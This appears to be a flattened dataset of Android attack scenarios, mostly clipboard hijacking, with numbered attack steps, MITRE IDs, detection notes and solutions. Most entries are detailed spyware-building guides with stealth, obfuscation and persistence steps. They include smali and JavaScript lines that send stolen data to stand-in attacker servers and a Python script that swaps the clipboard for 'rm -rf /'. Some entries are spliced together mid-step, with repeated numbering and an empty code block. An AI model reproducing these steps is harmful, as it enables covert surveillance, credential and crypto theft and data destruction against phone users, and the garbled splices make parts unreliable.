In future, app detects same patterns to infer user activity (e.g., watching video = Netflix). 10. Optionally trigger payloads (phishing, keylogging) when brightness matches target app profile.
Vulnerability: No permissions needed for light sensor, exposed system API
MITRE Technique: T1412 (Sensor Access), T1512 (Side-Channel via Screen State)
Impact: User profiling, app usage detection, targeted delivery
Detection Method: Detect sensor read frequency, sensor auditing tools
Solution: Restrict sensor access for background apps, implement permission model for non-motion sensors
Tags: Brightness Sensor, App Fingerprint, Android Side Channel, Light Sensor

Title: Browser Fingerprinting via Power Drain (JS-based)
Scenario Description: Attacker hosts a malicious website or popup on a rogue AP. JavaScript code in the page runs high-load operations in background to monitor how quickly the device drains power. The power drain rate (combined with device info) helps uniquely fingerprint the mobile browser, OS version, and even hardware.
Tools Used: HTML5, JavaScript (Power API / Web Worker), Web Server, Chrome Dev Tools, MITM Proxy, Burp Suite
Attack Steps: 1. Set up a rogue Wi-Fi access point using hostapd or airbase-ng. 2. Host a malicious HTML page on your web server (Apache/NGINX). 3. In HTML, embed JavaScript to create background Web Worker that performs CPU-intensive tasks (e.g., SHA-256 hashing, while(true) loops). 4. Measure how long the browser maintains execution before throttling – infer CPU performance. 5. If battery API is available (in older browsers), also read navigator.getBattery() and log battery percentage, charging state, drain time. 6. Collect this data into browser fingerprint along with: • User-Agent • Screen resolution • AudioContext fingerprint • Canvas fingerprint 7. Combine power drain signature with device stats to create a unique mobile fingerprint. 8. Log IP + fingerprint to attacker’s server. 9. Use this to track users across sessions or target specific device types.
Vulnerability: Power API abuse, JS sandbox execution
Detection Method: Monitor background CPU load, JS runtime behavior
Solution: Disable JS on unknown sites, restrict power API, use content blockers
Tags: Browser Fingerprint, Power Drain, JS Side Channel, Mobile Tracking

Title: Microphone Vibration-Based Eavesdropping
Scenario Description: This attack abuses the microphone on a mobile device to pick up faint vibrations caused by nearby sounds—such as keystrokes, human speech, or device interactions. A malicious app silently records audio and uses signal processing or ML to infer sensitive information like passwords or private conversations. This works even if the attacker cannot hear the sound directly, as vibrations travel through surfaces.
Tools Used: Android SDK, Custom App (Mic Access), Python (Librosa, NumPy, SciPy, TensorFlow), Audio Analysis Tools (Audacity), Android Emulator or Test Device
Attack Steps: 1. Create a Malicious Android App with Microphone Access: – Open Android Studio and create a new app. – Add microphone permission in AndroidManifest.xml: android.permission.RECORD_AUDIO – Use MediaRecorder or AudioRecord API to capture raw .wav or .pcm audio.2. Set Up Silent Background Recording: – Start recording as soon as the app launches. – Ensure no notification is shown (on older Android versions this was possible). – Save raw audio data in background, chunked into 10–30 second intervals.3. Place Device on Flat Surface (Lab Simulation): – Place test phone on wooden or metal desk. – Near the device, speak or tap (simulate password typing or conversations).4. Process Audio for Vibration Signatures: – Transfer recorded .wav files to your system. – Use Librosa and SciPy to apply: • High-pass filter (to isolate vibrations) • FFT (Fourier Transform) • Spectrogram plotting – Extract tap patterns or speech spectrums.5. (Optional) Speech or Keystroke Recognition: – Use a trained ML model (CNN or LSTM in TensorFlow) to classify words or keypress timing. – Alternatively, apply a simple amplitude-based rule set (if peak = X, infer key Y).6. Simulate App in Real Scenario (User Unlocking Phone): – Leave app running silently in the background. – When user types or speaks nearby, vibration or audio waves picked up. – Send inferred data to attacker server using HTTP POST or Firebase.7. (Advanced): Combine mic + accelerometer for better surface vibration pickup. 8. For Testing: Use Audacity to visualize vibrations; you’ll see spikes at tap/speech points.Important: This can be tested on your own device for safe experimentation.Real-world Research: MIT and Berkeley researchers showed that phone mics can reconstruct speech from glass vibrations (e.g., from 1–2m away in certain conditions).
Vulnerability: Mic access granted by user, no sensor isolation, background recording
MITRE Technique: T1421 (Audio Capture), T1412 (Sensor Abuse), T1512 (Vibration/Signal Inference)
Impact: Voice/speech theft, PIN/tap inference, privacy violation
Detection Method: Monitor microphone use via OS logs, check battery drain, inspect unknown apps with mic access
Solution: Enforce mic access restrictions, use OS mic indicators, prevent apps from running in background post screen lock
Tags: Microphone Side Channel, Vibration Listening, Android Eavesdropping, Mobile Mic Abuse

Title: Injecting Malicious Code via smali
Attack Type: Static Code Injection via App Repackaging
Scenario Description: In this attack, a malicious actor decompiles a legitimate Android APK file, injects custom smali (assembly-like) code for malicious actions (e.g., stealing SMS, logging keystrokes, C2 communication), and repackages it to look exactly like the original app. This cloned app can be uploaded to third-party app stores or shared via phishing links.
Tools Used: apktool, smali/baksmali, keytool, jarsigner, zipalign, Android Studio, VirusTotal (for testing), Android Emulator
Attack Steps:
1. Install Required Tools: – Install Java JDK, apktool, smali/baksmali, keytool, zipalign, jarsigner.2. Get Target APK: – Download the original APK (e.g., com.example.app.apk) from APKMirror or other sources.3. Decompile the APK using apktool: apktool d com.example.app.apk -o DecompiledApp – This creates a folder with all the .smali files and resources.4. Inject Malicious Code in smali: – Navigate to the .smali file of the main Activity (e.g., MainActivity.smali). – Locate the onCreate method: .method public onCreate(Landroid/os/Bundle;)V – Insert malicious code before return-void. Example: smali
const-string v0, "http://malicious-server.com/steal"
invoke-static {v0}, Lcom/example/malicious/Exfiltrate;->send(Ljava/lang/String;)V
– You can write custom smali methods under a new folder like /smali/com/example/malicious/Exfiltrate.smali to handle network communication.5. Rebuild the Modified App: apktool b DecompiledApp -o ClonedMaliciousApp.apk6. Sign the APK: – Generate a keystore: keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 – Sign the APK: jarsigner -verbose -keystore my-release-key.keystore ClonedMaliciousApp.apk alias_name7. Title: Permission Auto-Grant / Click Injection

For permissions that launch confirmation dialogs (e.g., draw over other apps, access usage stats, install unknown apps), trigger click events on those specific elements using node text matching (e.g., node.getText().equals("Allow")). 7. Combine this logic with delayed execution (Handler.postDelayed) to avoid detection and seem more natural. 8. Package and sign the APK using jarsigner or a third-party tool. Ask user to grant Accessibility Service manually (required only once). Once enabled, the app will monitor all system UI and inject permission-grant clicks automatically in the background. 10. Restrict side-loading apps from untrusted sources. 4. Implement MDM controls to audit app permissions in enterprise phones. 5. Make sure the app requests FOREGROUND_SERVICE or BIND_ACCESSIBILITY_SERVICE for persistent execution. Step 5: Trigger the Attack – Wait for the user to open a crypto app or copy a wallet address. The app will silently replace the copied address. When the user pastes it during a transaction (e.g., on Binance or Trust Wallet), the attacker’s address is used instead. Step 6: Receive the Funds – Once the victim unknowingly initiates the transfer to the attacker’s wallet, you can track the transaction via blockchain explorer (e.g., Etherscan for Ethereum, Blockchain.info for BTC). Optional Step 7: Obfuscate the Code – Use tools like ProGuard or APK obfuscators to hide the clipboard hijacking logic in the code to avoid detection by antivirus software. Step 8: Clean Up Evidence (Advanced) – Modify app name, hide app icon, remove logs if rooted, and clear install trails to reduce suspicion.
Vulnerability: Android Clipboard Service Exposure, Lack of User Validation on Pasted Data
Impact: Financial Loss, Untraceable Crypto Theft, Silent Data Manipulation
Detection Method: Monitor clipboard access logs, install behavior tracking tools (e.g., AppAudit, PrivacyBreacher), manually verify copied and pasted wallet addresses before confirming transactions
Solution: Use clipboard monitoring protection apps, verify clipboard content before pasting, avoid installing apps from unknown sources, disable clipboard access in background apps (via App Settings), update Android regularly
Source: Real-world malware campaigns like “ClipMiner”, “ClipboardStealer” observed in wild (2022–2024); MITRE ATT&CK T1056.001

Title: Clipboard Logging Over Time (Spyware Logger)
Scenario Description: In this attack, a malicious Android app is secretly installed on a user’s mobile phone and continuously monitors the clipboard in the background. Unlike crypto address replacement which targets one-time events, this spyware logs every clipboard content (passwords, emails, OTPs, banking info) over time and sends it to an attacker’s server or stores it locally. It’s a stealthy data exfiltration method used by mobile spyware and commercial stalkerware tools. Users remain unaware because the app runs in the background, has no visible UI, and requests no suspicious permissions except basic background access.
Tools Used: Android Studio, Java/Kotlin, ADB, Termux, Frida (for analysis), Firebase or custom API server (for data exfiltration), Emulator or Android Phone
Attack Steps: Step 1: Set up Logging Infrastructure – Create a backend (can be Firebase Realtime DB, Google Sheets via script, or a custom Python Flask server) that will receive and store clipboard data. The backend should accept POST requests containing timestamp and clipboard contents from the infected device. Test the server endpoint using Postman or Termux curl. Step 2: Build a Malicious Android App (Spyware) – Open Android Studio and create a simple app with no visible UI (can be disguised as a calculator, cleaner, wallpaper app). In MainActivity.java or a background Service, use the ClipboardManager API to access clipboard content continuously. Step 3: Create Persistent Clipboard Logger – Register a ClipboardManager.OnPrimaryClipChangedListener to trigger every time the clipboard changes. Inside the listener, fetch the clipboard content and send it to the attacker's server along with the device ID and timestamp using HttpURLConnection or Retrofit. The logic runs continuously in a ForegroundService or as a JobIntentService to survive system restarts. Use AlarmManager or WorkManager to keep the logging active even after reboot or force stop. Step 4: Deploy the App on Target Mobile Device – Use USB debugging with adb install to sideload the APK on the target Android device or send it via email/drive/social engineering and trick the user into installing. Make sure the app does not request suspicious permissions to avoid detection. Request only basic permissions like Internet and ForegroundService. Step 5: Hide the App from App Drawer – Modify the manifest to disable the launcher icon. You can do this by not defining a launcher activity or setting the icon visibility to "false." This makes the app invisible to normal users. Step 6: Start Background Clipboard Logging – Once installed, the app runs silently in the background. Each time the user copies something to the clipboard (e.g., password, OTP, wallet address, message), the listener gets triggered, and the copied content is sent to the attacker’s server. This creates a full timeline of the victim's sensitive data. Step 7: Monitor Logs in Real Time – On the attacker's end, monitor all incoming clipboard data sorted by timestamp and device ID. Analyze for keywords like "OTP", "login", "password", or crypto strings. You can use a simple Flask dashboard or Google Sheet to track all entries in real-time. Step 8: Optional – Add Code Obfuscation – Use tools like ProGuard or DexGuard to encrypt and hide logging logic. This helps bypass mobile antivirus detection. Optionally sign the APK with a custom keystore to avoid Google Play warnings. Step 9: Long-Term Stealth Operation – The spyware runs indefinitely in background unless detected by the user. Logs can be used to harvest credentials, hijack sessions, bypass 2FA, and track user behavior without their consent.
Vulnerability: Android ClipboardManager API is globally accessible by background apps without notification to the user
Impact: Identity Theft, Credential Harvesting, OTP Interception, Privacy Violation, Surveillance
Detection Method: Monitor clipboard access logs using tools like AppAudit, Activity Watcher, or Frida scripts. Unusual background data usage by unknown apps can also indicate spyware. Battery and memory consumption spikes can be a clue.
Solution: Educate users to only install apps from official stores, use clipboard protection apps like Clipper or Access Dots, run regular antivirus scans, check background data permissions, and reboot device to disable persistent services. Android 10+ users should enable clipboard privacy under settings.
Source: Based on real malware like xHelper, MonitorMinor, and APT campaigns (Pegasus style) documented by Kaspersky, EFF, Lookout Labs (2019–2023). MITRE ATT&CK Ref: T1056.001

Title: Accessibility-Based Clipboard Monitoring
Scenario Description: In this attack, the malicious app abuses Android’s Accessibility Services to monitor and extract clipboard contents without using the standard ClipboardManager API. Accessibility Services are meant for helping users with disabilities (e.g., screen readers), but when misused, they give attackers near-complete control over screen content, UI interactions, and clipboard data. Unlike normal clipboard hijackers, this method bypasses restrictions imposed on newer Android versions (Android 10+), which limit direct clipboard access. By impersonating an accessibility tool, spyware can detect clipboard changes by observing UI events and reading the copied text directly from screen nodes, even when traditional clipboard access is blocked.
Tools Used: Android Studio, Java/Kotlin, APKTool, ADB, Termux, Android Emulator or physical device, Logcat, Frida (optional), Firebase or remote server for exfiltration
Attack Steps: Step 1: Create a Firebase or Custom Logging Server – Set up a backend server or Firebase Realtime Database that will receive and store logged clipboard data. This is where the exfiltrated text will be sent from the victim device. Test it using simple POST requests or curl. Step 2: Develop a Malicious Android App with Accessibility Service – In Android Studio, build an app that pretends to serve a legitimate function (like a cleaner, booster, etc.) and declare a custom Accessibility Service in the manifest (<service android:name=".MyAccessibilityService" with android.permission.BIND_ACCESSIBILITY_SERVICE). Add metadata in accessibilityservice.xml with proper configuration (event types, feedback type, etc.). Step 3: Request Accessibility Permission at Runtime – On first run, the app should request the user to enable accessibility service for it by directing them to Settings.ACTION_ACCESSIBILITY_SETTINGS. Use social engineering (e.g., fake instruction screens like “Enable Booster for better performance”) to convince the user. Once enabled, this service runs with elevated privileges. Step 4: Monitor Clipboard-Related Events – Inside MyAccessibilityService, override onAccessibilityEvent(). Watch for event types like TYPE_VIEW_TEXT_CHANGED, TYPE_VIEW_FOCUSED, and TYPE_WINDOW_CONTENT_CHANGED. These help track when user interacts with text fields. Step 5: Extract Text Nodes via AccessibilityNodeInfo – Use the service to fetch screen content using getRootInActiveWindow() and traverse AccessibilityNodeInfo tree. For each node, check if it's an EditText or copyable field, and if its content has changed. This allows you to read the copied text directly from the UI even if the user didn’t explicitly paste it yet. This bypasses the clipboard permission restrictions. Step 6: Log and Exfiltrate Clipboard Data – Each time a copied string is detected (email, OTP, crypto address, message), send the data along with timestamp and app context (like the package name of the source app) to your backend server using Retrofit or HTTP client. Optionally, save logs locally first and sync later when online. Step 7: Run Service in Background Stealthily – Ensure the Accessibility Service is declared with android:exported=false for stealth and use a persistent foreground service to avoid system kill. Hide app icon from launcher using intent filters. The spyware runs indefinitely without user awareness. Step 8: Optional – Add Filters and Obfuscation – Add filters to log only relevant keywords (OTP, password, key, wallet) and use ProGuard or DexGuard to obfuscate your code and make it harder to detect during static analysis. Step 9: Monitor and Analyze Logs – On the attacker’s side, monitor the backend logs in real-time. Analyze text data to capture credentials, tokens, transaction details, or personal messages copied by the user. This data can be exploited or sold on black markets. Step 10: Clean Up Traces (Advanced) – If building persistent spyware, use a silent update mechanism or dropper loader to reload the service even after uninstall attempts. Hide logs, remove from recent apps, and disable app crash logs.
Target Type: Android Mobile Devices (especially Android 10 and above)
Vulnerability: Abuse of Accessibility Services, UI Content Exposure, Clipboard Monitoring via Screen Parsing
MITRE Technique: T1056.001 (Input Capture – Accessibility Abuse for Clipboard Reading)
Impact: Full privacy compromise, Stealth data exfiltration, Theft of passwords, crypto addresses, private chats, OTPs, 2FA codes, identity data
Detection Method: Use Android Accessibility Service Monitor apps, review battery and background process usage, analyze Logcat logs for suspicious services, use Frida scripts to detect misuse of AccessibilityNodeInfo or services registering too many events
Solution: Educate users never to allow unknown apps access to Accessibility Services, regularly check Accessibility settings for unknown services, use Android security apps that monitor abuse, limit background activity of unused apps, enable Play Protect, and run monthly full-device scans. From Android 12+, clipboard auto-clearing reduces risk.
Source: Confirmed techniques observed in real spyware like “MonitorMinor”, “GravityRAT”, and Chinese stalkerware apps abusing Accessibility API (2020–2024), Documented in Kaspersky and Lookout reports, MITRE T1056.001

Title: Floating Clipboard Overlay (Visual Hijack)
Scenario Description: In this attack, a malicious Android app creates a floating window (overlay) that mimics a helpful clipboard or “clipboard history” tool. When a user copies sensitive text (e.g., OTP, password, crypto address), this fake overlay appears as a system-style popup and silently shows altered or fake data. The goal is to mislead the user into trusting the overlay content, and copying/pasting or acting on that manipulated visual info, while the real clipboard is hijacked or misused silently in the background. This attack is especially dangerous because overlays bypass app sandboxing and are commonly used by phishing malware to create fake input fields, dialogs, or clipboard UIs.
Tools Used: Android Studio, Java/Kotlin, Android Emulator or rooted phone, APKTool, Termux, ADB, AutoInput App (for automation), Firebase or HTTP Server (optional), Android Overlay Permission (SYSTEM_ALERT_WINDOW)
Attack Steps: Step 1: Build a Fake Utility App Offering Clipboard Features – Create a seemingly useful Android app (e.g., “Clipboard Manager”, “Smart Copy Tool”, or “Floating Translator”) using Android Studio. The app will claim to improve the user’s clipboard or display helpful overlays. In the manifest, request SYSTEM_ALERT_WINDOW permission, which allows the app to draw over other apps. This is essential for creating overlays that appear on top of other apps like WhatsApp, banking apps, or Google Chrome. Step 2: Design a Floating Overlay UI – Create a floating layout (e.g., WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY) that mimics Android system dialogs or clipboard notifications. Make it look authentic by copying styles, colors, and fonts from native Android clipboard previews. Add fake information to this overlay, such as a misleading copied text or slightly altered wallet address. You can even use animation to simulate "copy complete" feedback. Step 3: Monitor Clipboard Changes in the Background – In your app’s background service, use Android’s ClipboardManager.OnPrimaryClipChangedListener to detect when a user copies text to the clipboard. When a change is detected, extract the copied data using getPrimaryClip() and analyze if it matches specific patterns (e.g., if it looks like a password, OTP, crypto address, or credit card). Step 4: Trigger the Overlay with Fake Info – Immediately after detecting clipboard data, launch your overlay window using the WindowManager service. Display the fake or manipulated clipboard content in the floating window. For example, if the copied address is 0xABC123, display 0xA8C123 in the overlay. Most users will glance at the overlay and assume it’s their valid data. Step 5: Allow Overlay Interaction (Optional) – Make the overlay interactive. Add a “Copy Again” button, which actually sets the clipboard to the attacker’s address or a phishing link. You can also create an input field (EditText) over login forms that captures and stores what the user types, then relays it to your server. This turns the overlay into a phishing interface. Step 6: Stealth Execution – Ensure your overlay window is set with flags like FLAG_NOT_FOCUSABLE and FLAG_LAYOUT_IN_SCREEN so it doesn’t trigger user suspicion. The app should also use a background service with low memory footprint to avoid Android killing it. Hide the app icon or rename the app to look like a system component. Step 7: Hijack Actual Clipboard in Background – While the user is tricked by the overlay, in the background your app can either replace the clipboard content using setPrimaryClip() or log and exfiltrate the real clipboard content to your remote server or Firebase. Now, the user trusts the fake overlay, while the real clipboard is compromised. Step 8: Deploy on Target Device – Sideload the malicious APK using adb install or via social engineering (e.g., offering clipboard utility on a shady website or a fake app store). Ask user to manually grant “Draw over apps” permission. Many users grant this for apps like screen recorders or chat heads. Step 9: Analyze and Store Logs (Optional) – You can add code to log all copied content and send it to your Firebase backend with timestamps, app context (like package name), and overlay status. This builds a timeline of user behavior. Step 10: Maintain Persistence and Update Overlay Triggers – Add BootReceiver to relaunch overlay service at startup. Optionally, enhance by detecting specific apps (e.g., Wallet, Banking, Messaging) using UsageStatsManager or Accessibility Events to show overlays only when users are in sensitive apps. This makes the attack more targeted and stealthy.
Vulnerability: SYSTEM_ALERT_WINDOW misuse, Clipboard API misuse, UI Deception, Lack of overlay detection in userspace
MITRE Technique: T1201 (Input Capture via GUI Overlay), T1056.001 (Clipboard Monitoring), T1141 (Input Prompt Spoofing)
Impact: User tricked into copying, pasting or trusting fake clipboard content, Financial theft, Fake login/phishing, Crypto theft, OTP hijack, Identity leakage
Detection Method: Use Play Protect or security apps that detect apps with overlay permission and clipboard access. Observe strange overlay windows or unexpected popups. Monitor accessibility or usage stat access for clipboard-type apps. Use Logcat to trace overlay service calls.
Solution: Avoid granting “Draw over other apps” permission unless absolutely trusted. Check which apps have SYSTEM_ALERT_WINDOW via Settings > Special App Access. Use clipboard managers from trusted developers. On Android 12+, clipboard auto-clears after short time to reduce exposure.
Source: Real-world malware like “Anubis Banker”, “FakeAV”, and “Clippy Trojan” abused overlay for phishing and clipboard misdirection. Research confirmed in TrendMicro and ESET Android malware reports 2019–2024. MITRE T1201, T1056.001

Title: Malicious WebView Clipboard Leak
Scenario Description: In this attack, a malicious mobile app embeds a WebView component that silently executes JavaScript to read clipboard content from the user’s device whenever a user opens the app. The app looks legitimate (e.g., a news app or quiz app), but under the hood, it opens a web page inside a WebView and uses injected JavaScript to access the clipboard without user consent. Some older Android WebView versions and custom keyboards allow JavaScript or focused input fields to automatically capture clipboard content without needing special permissions. This attack is highly stealthy and effective for extracting sensitive copied content such as OTPs, passwords, crypto addresses, and personal messages.
Tools Used: Android Studio, Java/Kotlin, ADB, Termux, APKTool, Android Emulator or device, Frida (optional), Web Server (e.g., Flask/Node.js), JavaScript Payload
Attack Steps: Step 1: Build a Malicious Android App with WebView – In Android Studio, create a new Android app (e.g., “Fast News”, “Fun Quiz App”, “Currency Converter”) that uses a WebView component to load web content. In your layout file (activity_main.xml), include a <WebView> element. In your MainActivity.java, configure the WebView with webView.getSettings().setJavaScriptEnabled(true); and load a remote or local HTML file using webView.loadUrl("file:///android_asset/clipboardsteal.html"); or a hosted server URL. Step 2: Create JavaScript to Access Clipboard – Write a small HTML+JavaScript file (e.g., clipboardsteal.html) that includes an input field and auto-focus behavior. The JavaScript code should auto-focus a hidden input field and attempt to read the clipboard content using navigator.clipboard.readText() (on supported Android versions with focus). Example: <script>setInterval(() => { navigator.clipboard.readText().then(text => fetch('https://attacker-server.com/leak', { method: 'POST', body: text }) ) }, 3000);</script>. This polls the clipboard every few seconds and leaks the data. Step 3: Serve the HTML File Locally or Host on Web Server – You can embed the HTML file in assets/ folder of your APK, or upload it to your remote server. The WebView will load and execute it when the app starts. Step 4: Add Clipboard Auto-Focus Trigger – Make sure your HTML sets focus on a hidden or visible input tag (<input autofocus>) so that clipboard access permissions (on some Android versions) are granted automatically. Some keyboard apps and browser engines allow this without user interaction. Step 5: Add JavaScript Interface (Optional) – To exfiltrate clipboard data back to Java layer, add a @JavascriptInterface bridge in MainActivity.java. You can write a Java function to capture text and send it to a remote server or log it locally. Step 6: Deploy the APK on Target Device – Sideload the APK using adb install or distribute it using social engineering (e.g., fake download site). Once opened, the app silently loads the WebView and executes the JavaScript that reads and leaks clipboard content. No special Android permissions are needed, and the victim doesn’t see any warning. Step 7: View Stolen Clipboard Data on Server – On your server (Flask or Node.js backend), log the POST requests containing the leaked clipboard contents. You can also record the device's IP, user-agent, and timestamp for identifying victims and behavior. Step 8: Hide WebView Activity (Optional) – To make the app stealthier, you can use a 0dp height and width WebView or hide it behind a splash screen while it still loads the malicious JavaScript in the background. Optionally delay payload execution using timers. Step 9: Persistently Monitor Clipboard – Use a background service or looped page reloads every few seconds in JavaScript to continuously access clipboard data, especially if the user stays in the app for long (e.g., during quizzes or reading).
Target Type: Android Mobile Users (Android 9 and lower especially)
Vulnerability: Abuse of WebView + JavaScript Clipboard API without permissions or user visibility
MITRE Technique: T1056.001 (Input Capture – Clipboard Monitoring), T1189 (Drive-by Compromise via WebView), T1185 (Browser Content Manipulation)
Impact: Silent extraction of copied sensitive data, OTP leakage, crypto address theft, credential theft, user behavior profiling, stealth spyware injection
Detection Method: Use dynamic analysis tools (e.g., Frida, Logcat) to detect clipboard access from WebView apps, monitor outbound requests to unknown servers, block WebView JavaScript execution via security software, observe background data use
Solution: Educate users to avoid unknown apps with WebView or browser-like behavior, use Android 10+ devices where clipboard access is restricted, disable third-party keyboards that allow JS clipboard read, monitor clipboard usage with security apps
Source: Based on real clipboard-leak exploits in hybrid malware (e.g., WebView RATs, spyware APKs), documented in Android exploit studies by Lookout, OWASP MAS, and XDA forums (2021–2024), MITRE ATT&CK T1056.001

Title: Shared Clipboard Abuse via Sync (e.g., Android–PC)
Scenario Description: In this attack, the clipboard sync feature between an Android mobile phone and a desktop (usually Windows PC) is abused to intercept, steal, or manipulate clipboard contents shared across devices. Many modern apps like Microsoft SwiftKey, KDE Connect, Pushbullet, and Google GBoard offer clipboard syncing via Bluetooth, Wi-Fi, or cloud accounts. If an attacker gains access to either the phone or PC, they can silently monitor, alter, or inject clipboard content on the paired device. For example, a clipboard copied on Android can be read and replaced on the desktop by spyware, or vice versa. Since sync services operate over trusted channels (Wi-Fi, Microsoft Account), users rarely notice clipboard syncing misuse.
Tools Used: Windows PC, Android Device, Microsoft SwiftKey, KDE Connect, Pushbullet, Gboard Clipboard Sync, Wireshark, ADB, Frida, MITMproxy, Python Flask Server, Clipboard Viewers, Termux
Attack Steps: Step 1: Set up Target Environment with Shared Clipboard Enabled – Use an Android device and connect it to a Windows PC using Microsoft SwiftKey (with cloud sync on), KDE Connect, or Gboard with Google Account clipboard sync enabled. Confirm that copying text on one device reflects on the other. This is common in productivity workflows. Step 2: Simulate or Access a Compromised Device – Gain access to either the Android phone (e.g., via physical access or infected app) or the Windows PC (e.g., via clipboard logger malware or RAT). You don’t need both devices—compromise of one is enough because clipboard sync works bidirectionally. Step 3: Set Up a Clipboard Logger on PC (Attacker Side) – On the Windows machine, install or write a Python script that uses ctypes and win32clipboard to monitor clipboard changes in real time. Log every new clipboard item to a local file or send it to a remote server. You can also use tools like Clipboard Logger (open-source) or build your own with AutoHotkey. Since synced Android clips show up on the PC clipboard, this captures data copied on the phone. Step 4: Modify Synced Clipboard on PC (Hijack from Desktop) – Using your clipboard script, detect specific content like a crypto address, password, or OTP copied on Android and synced to PC. Automatically replace the clipboard content with attacker-controlled text (e.g., a phishing link or wallet address) using SetClipboardData() in Python. This new content will sync back to the Android clipboard silently. When the mobile user pastes it, they unknowingly use tampered content. Step 5: Perform the Same in Reverse (Hijack from Mobile) – If you control the mobile device (via a malicious APK with ClipboardManager access), implement a background service that monitors clipboard changes. If it sees content like credentials or crypto addresses copied from the desktop (and synced to mobile), it logs or replaces it silently using ClipboardManager.setPrimaryClip(). This works even without root. Step 6: Exfiltrate Clipboard Contents from One Device – Once clipboard sync is active, the attacker only needs to steal from one end. You can now monitor all cross-device clipboard content — including personal messages, OTPs, passwords, crypto info, copied chats — and store it on a remote server for further abuse. Use simple Flask API endpoints or Firebase to receive and timestamp logs. Step 7: Add Filters and Automation for Injection – To avoid suspicion, add filters in your logger (e.g., only act if clipText.contains("0x") or @gmail.com) and avoid unnecessary injection. This makes the attack stealthier. You can also inject malicious scripts, phishing links, or exploit URLs copied into chats, emails, or browsers. Step 8: Hide Traces and Maintain Persistence – On Windows, hide your script as a startup program or disguise it as a system tray app. On Android, hide the app icon and use foregroundServiceType="dataSync" in manifest for persistent operation. Clean logs and hide in recent apps list. Step 9: Observe Long-Term Behavior and Targeted Data – Let the script run for hours or days. Clipboard sync is automatic and continuous, so users often forget it's even active. Over time, it will capture a large amount of sensitive personal data across both devices.
Vulnerability: Abuse of Cross-Device Clipboard Sync, Lack of User Awareness, ClipboardManager API, Windows Clipboard API
MITRE Technique: T1056.001 (Input Capture – Clipboard Monitoring), T1021.001 (Remote Services – Desktop Access), T1086 (PowerShell or Script Execution)
Impact: Identity theft, Crypto address replacement, Phishing link injection, Full clipboard surveillance across multiple devices, Sensitive information leakage, Social engineering vector
Detection Method: Check clipboard history for unexpected entries. Monitor data transfer logs between PC and phone using tools like Wireshark or KDE Connect logs. Observe strange behavior like clipboard changes without user action. Use endpoint monitoring tools to track clipboard hooks or background scripts.
Solution: Disable clipboard sync features unless absolutely required. In SwiftKey/Gboard, turn off clipboard cloud sync in settings. Avoid connecting unknown PCs to your phone using KDE Connect. Run regular malware scans on both devices. Use hardened keyboard apps that restrict clipboard sharing. Use isolation containers for sensitive apps that block clipboard sync.
Source: Confirmed techniques based on clipboard surveillance methods seen in tools like Remcos RAT, C2-based clip injectors, and shared-clipboard malware campaigns documented by Kaspersky, CERT-EU, and Microsoft Defender Threat Intelligence (2020–2024). MITRE ATT&CK T1056.001

Title: Clipboard Command Injection in Mobile
Scenario Description: In this attack, a malicious mobile app or script monitors the user's clipboard. When it detects specific content (like commands, wallet addresses, or links), it silently replaces the clipboard data with malicious shell commands or code snippets. If the user unknowingly pastes this into a terminal emulator (Termux, Qute) or other code execution environment on mobile, the attacker gains remote code execution or data exfiltration. This is especially dangerous when clipboard content is pasted into elevated shell sessions.
Tools Used: Android Debug Bridge (ADB), Termux App, Evil Clipboard Logger Script (Python), Tasker (optional), Kali Linux or Windows PC with ADB installed
Attack Steps:
Step 1: Set up a test Android phone and enable Developer Options → USB Debugging.Step 2: Install Termux on the device from F-Droid (not Play Store).Step 3: On your attacker PC, connect the Android device using USB and verify using adb devices.Step 4: Install a malicious clipboard monitoring app or simulate via ADB with this command: adb shell am startservice --user 0 -n com.termux/.app.TermuxService to run background Termux script.Step 5: Create a Python script (clipwatch.py) that monitors clipboard changes and injects malicious command:python
import time, pyperclip
last = ""
while True:
    text = pyperclip.paste()
    if text != last:
        last = text
        if 'apt install' in text:
            pyperclip.copy('rm -rf / --no-preserve-root')
    time.sleep(0.5)
Step 6: On the mobile device, simulate clipboard change by copying a harmless command: apt install nano.Step 7: The script detects this and replaces the clipboard with rm -rf / --no-preserve-root.Step 8: The victim (you for testing) opens Termux and pastes the clipboard using long press → paste or using hardware keyboard.Step 9: Upon pressing enter, the malicious command runs and wipes the filesystem (don’t run this for real).Step 10: Replace the payload with safe test ones like echo hacked > ~/test.txt for safe simulation.Step 11: You’ve successfully executed a clipboard command injection attack where the user unknowingly runs harmful command pasted from clipboard.
Impact: Remote Code Execution, Data Loss, System Corruption
Detection Method: Use clipboard history app, Monitor Termux logs, Use security software with clipboard monitoring
Solution: Restrict clipboard access for background apps; don’t paste blindly into Termux or elevated apps; implement clipboard sanitization in apps; educate users not to paste unknown clipboard content
Tags: clipboard, mobile, hijacking, termux, adb, command injection, android, clipboard logger, beginner-friendly

Title: Misconfigured exported=true Components in Android
Scenario Description: This vulnerability occurs when an Android app exposes sensitive components (such as Activities, BroadcastReceivers, Services, or ContentProviders) by setting android:exported="true" in the manifest without proper access control (like permissions). An attacker app can send crafted intents to these exported components to hijack the functionality. If clipboard access is linked to these components (e.g., broadcast receivers that read clipboard), it enables powerful hijack attacks that allow reading clipboard, launching hidden activities, or executing dangerous functions remotely.
Tools Used: Android Studio, APKTool, Genymotion Emulator or Physical Android Device, ADB, Frida (optional), Sample vulnerable APK (with exported receiver), Attacker App (you build)
Attack Steps:
Step 1: Download or build a vulnerable test app (VulnerableApp.apk) with a BroadcastReceiver set to exported=true in AndroidManifest.xml, like:xml





Step 2: Install this vulnerable app on your test Android device using adb install VulnerableApp.apk.Step 3: Confirm it has a component that listens to boot or clipboard event and is exported publicly.Step 4: Now, build a small malicious app (AttackerApp) in Android Studio. It doesn't need UI. Just an activity that sends an Intent to the exported receiver of the target app.Step 5: Add the following Java/Kotlin code to send fake clipboard or BOOT_COMPLETED broadcast:java
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.vulnerable.app", "com.vulnerable.app.ClipboardReceiver"));
intent.setAction("android.intent.action.BOOT_COMPLETED");
sendBroadcast(intent);
Step 6: Install and run your AttackerApp on the same device using adb install AttackerApp.apk.Step 7: When you run the AttackerApp, it will invoke the exported receiver inside VulnerableApp as if the device booted. If the vulnerable app’s receiver fetches clipboard and performs logic (e.g., sends to server), the attacker triggers that code without user’s permission.Step 8: Replace the action with any custom intent action the target app listens for. You can discover these using APKTool, jadx, or frida-trace.Step 9: If the vulnerable component launches an internal Activity, use intent flags to make it visible or redirect to malicious screens.Step 10: You've now hijacked an exported component using a fake intent and clipboard trigger from another app — a powerful attack showing why exported=true must be protected.
